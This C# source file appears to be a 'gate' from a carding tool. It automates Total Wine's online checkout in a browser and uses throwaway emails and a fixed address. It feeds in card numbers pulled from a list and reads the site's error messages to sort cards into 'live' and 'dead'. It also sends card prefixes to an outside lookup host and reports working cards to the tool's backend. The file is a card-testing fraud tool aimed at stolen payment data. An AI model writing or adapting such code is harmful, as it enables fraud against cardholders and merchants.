using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Totalwine
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://softoo.info/thunder/bin.php/?bin=" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                return jsonString.Trim();
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }


            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
            {

                Thunder._Form1.update_progresbar(5);
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");//"--headless"

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.totalwine.com/beer/c/c0010";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";
                var producto = "/html/body/div[1]/div/div/main/div/div[2]/div[2]/div[3]/article["+RandomNumber(1,24)+"]/div[1]/a";

                try
                {
                    if (tiempoElemento(By.XPath(producto)))
                    {

                        driver.FindElementByXPath(producto).Click();
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("//*[@id='AT-atc-upsell']")))
                        {
                            driver.FindElementByXPath("//*[@id='AT-atc-upsell']").Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.XPath("/html/body/div[12]/div/div/div[2]/div[2]/a")))
                            {
                                driver.FindElementByXPath("/html/body/div[12]/div/div/div[2]/div[2]/a").Click();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("//*[@id='main']/div/div[1]/div/div[2]/div/div/div[2]/button")))
                                {
                                    driver.FindElementByXPath("//*[@id='main']/div/div[1]/div/div[2]/div/div/div[2]/button").Click();
                                    Thread.Sleep(1000);
                                    if (tiempoElemento(By.XPath("/html/body/div[9]/div[2]/div[2]/div[2]/div[3]/div/div[1]/span[1]")))
                                    {
                                        driver.FindElementByXPath("/html/body/div[9]/div[2]/div[2]/div[2]/div[3]/div/div[1]/span[1]").Click();
                                        Thread.Sleep(1000);

                                        if (tiempoElemento(By.XPath("/html/body/div[9]/div[2]/div[2]/div[2]/div[4]/div/button")))
                                        {
                                            driver.FindElementByXPath("/html/body/div[9]/div[2]/div[2]/div[2]/div[4]/div/button").Click();
                                            Thread.Sleep(1000);

                                            if (tiempoElemento(By.XPath("//*[@id='buttonEnabled']/button")))
                                            {
                                                driver.FindElementByXPath("//*[@id='buttonEnabled']/button").Click();
                                                Thread.Sleep(1000);

                                                if (tiempoElemento(By.XPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[1]/div/section/div[3]/section/div[2]/button"))){
                                                    driver.FindElementByXPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[1]/div/section/div[3]/section/div[2]/button").Click();
                                                    Thread.Sleep(1000);

                                                    if (tiempoElemento(By.XPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[2]/div[2]/div[5]/form/div[1]/div/fieldset/div/input")))
                                                    {
                                                        driver.FindElementByXPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[2]/div[2]/div[5]/form/div[1]/div/fieldset/div/input").SendKeys(correo);
                                                        Thread.Sleep(1000);
                                                        driver.FindElementByXPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[2]/div[2]/div[5]/form/div[2]/div/fieldset/div/input").SendKeys("2137264657");
                                                        Thread.Sleep(1000);
                                                        driver.FindElementByXPath("//*[@id='2-accordion-button']").Click();
                                                        Thread.Sleep(1000);

                                                        if (tiempoElemento(By.XPath("//*[@id='first-data-payment-field-card']")))
                                                        {
                                                            pago();
                                                        }
                                                        else
                                                        {
                                                            restart();
                                                        }
                                                    }
                                                    else
                                                    {
                                                        restart();
                                                    }
                                                }
                                                else
                                                {
                                                    restart();
                                                }
                                            }
                                            else
                                            {
                                                restart();
                                            }
                                        }
                                        else
                                        {
                                            restart();
                                        }
                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                       


                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
                    {
                        restart();
                    }

                }

            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {

            if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
            {
                try
                {
                    pagos = 0;

                    driver.Close();
                    driver.Quit();
                    load();
                }
                catch (Exception)
                {


                    pagos = 0;
                    driver.Quit();
                    load();
                }
            }


        }

        private void pago()
        {
            try
            {



                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
                {
                    if (pagos < 12)
                    {
                        Thunder._Form1.update_progresbar(80);

                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        if (pagos == 0)
                        {
                            if (tiempoElemento(By.Name("billingAddress1")))
                            {
                                driver.FindElementByName("billingAddress1").SendKeys("4208 grainary ave");
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[3]/div[2]/form/div[2]/div[1]/ul/li")))
                                {
                                    driver.FindElementByXPath("//*[@id='main']/div/div[3]/div/div[1]/div/div[3]/div[2]/form/div[2]/div[1]/ul/li").Click();
                                    Thread.Sleep(1000);
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }

                        //if (tiempoElemento(By.XPath("//*[@id='first-data-payment-field-card']")))
                        //{
                            
                        //    driver.FindElementByXPath("//*[@id='first-data-payment-field-card']")

                        //}
                        //else
                        //{
                        //    restart();
                        //}


                        Thunder._Form1.update_progresbar(95);

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = "";
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Thunder._Form1.numcc() > 0 && Variables.run == true && Variables.gate == "2")
                {
                    restart();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                Thunder._Form1.abort();
                return;
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
                Thunder._Form1.abort();
                return;
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {



                    if (IsElementPresent(By.XPath("/html/body/div[4]/div/div[1]/div[2]/h5")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[4]/div/div[1]/div[2]/h5")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[4]/div/div[1]/div[2]/h5")).Text.Contains("Your card's security code is incorrect."))
                            {
                                Thunder._Form1.agrgar_live_cvv("(no cvc) - ");
                                estado = "live";
                            }
                            else
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='app']/div[3]/div[4]/div/div/h3")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='app']/div[3]/div[4]/div/div/h3")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='app']/div[3]/div[4]/div/div/h3")).Text.Trim() != "")
                            {

                                estado = "dead2";
                            }
                        }
                    }

                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead2")
            {
                pagos = 20;

                return false;

            }

            if (estado == "dead")
            {

                if (tiempoElemento(By.XPath("//*[@id='card-number']/div/iframe")))
                {
                    driver.SwitchTo().Frame(driver.FindElementByXPath("//*[@id='card-number']/div/iframe"));
                    Thread.Sleep(500);

                    driver.FindElementByName("cardnumber").Clear();
                    Thread.Sleep(300);
                    driver.FindElementByName("cardnumber").Clear();
                    Thread.Sleep(300);
                    driver.SwitchTo().ParentFrame();
                    Thread.Sleep(500);
                    if (tiempoElemento(By.XPath("//*[@id='card-expiry']/div/iframe")))
                    {
                        driver.SwitchTo().Frame(driver.FindElementByXPath("//*[@id='card-expiry']/div/iframe"));
                        Thread.Sleep(500);

                        driver.FindElementByName("exp-date").Clear();
                        Thread.Sleep(300);
                        driver.FindElementByName("exp-date").Clear();
                        Thread.Sleep(300);
                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(500);
                        if (tiempoElemento(By.XPath("//*[@id='card-cvc']/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElementByXPath("//*[@id='card-cvc']/div/iframe"));
                            Thread.Sleep(500);

                            driver.FindElementByName("cvc").Clear();
                            Thread.Sleep(300);
                            driver.FindElementByName("cvc").Clear();
                            Thread.Sleep(300);
                            driver.SwitchTo().ParentFrame();
                            Thread.Sleep(500);

                            return false;


                        }
                        else
                        {
                            restart();
                        }

                        //*[@id="card-cvc"]/div/iframe
                    }
                    else
                    {
                        restart();
                    }



                }
                else
                {
                    restart();
                }
                Thread.Sleep(1000);



                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

